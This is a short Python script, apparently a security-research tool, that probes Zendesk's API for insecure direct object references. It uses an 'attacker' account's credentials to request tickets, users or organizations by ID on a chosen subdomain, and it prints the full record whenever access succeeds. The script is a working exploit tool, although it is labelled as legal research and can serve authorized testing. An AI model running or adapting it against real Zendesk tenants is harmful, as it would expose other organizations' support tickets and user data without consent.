import requests
import json
import argparse
import sys

class ZendeskTester:
    def __init__(self, subdomain, email, token):
        self.base_url = f"https://{subdomain}.zendesk.com/api/v2"
        self.auth = (f"{email}/token", token)
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Zendesk-Security-Researcher/1.0"})

    def check_endpoint(self, endpoint, object_id):
        url = f"{self.base_url}/{endpoint}/{object_id}.json"
        try:
            response = self.session.get(url, auth=self.auth, timeout=10)
            return response
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

def test_idor(target_subdomain, attacker_email, attacker_token, target_id, endpoint="tickets"):
    print(f"[*] Testing IDOR on {target_subdomain} for {endpoint} ID: {target_id}")
    tester = ZendeskTester(target_subdomain, attacker_email, attacker_token)

    res = tester.check_endpoint(endpoint, target_id)

    if res is None:
        return False

    if res.status_code == 200:
        print(f"[!] VULNERABLE: Successfully accessed {endpoint} {target_id} on {target_subdomain}")
        try:
            print(json.dumps(res.json(), indent=2))
        except:
            print(res.text[:200])
        return True
    elif res.status_code in [401, 403, 404]:
        print(f"[+] Secure: Received {res.status_code} for {endpoint} {target_id}")
        return False
    else:
        print(f"[-] Unexpected response: {res.status_code}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zendesk IDOR Testing Tool (Legal Research)")
    parser.add_argument("--subdomain", required=True, help="Target subdomain")
    parser.add_argument("--email", required=True, help="Attacker email")
    parser.add_argument("--token", required=True, help="Attacker API token")
    parser.add_argument("--id", required=True, help="Target Object ID")
    parser.add_argument("--type", default="tickets", help="Object type (tickets, users, organizations)")

    args = parser.parse_args()

    test_idor(args.subdomain, args.email, args.token, args.id, args.type)
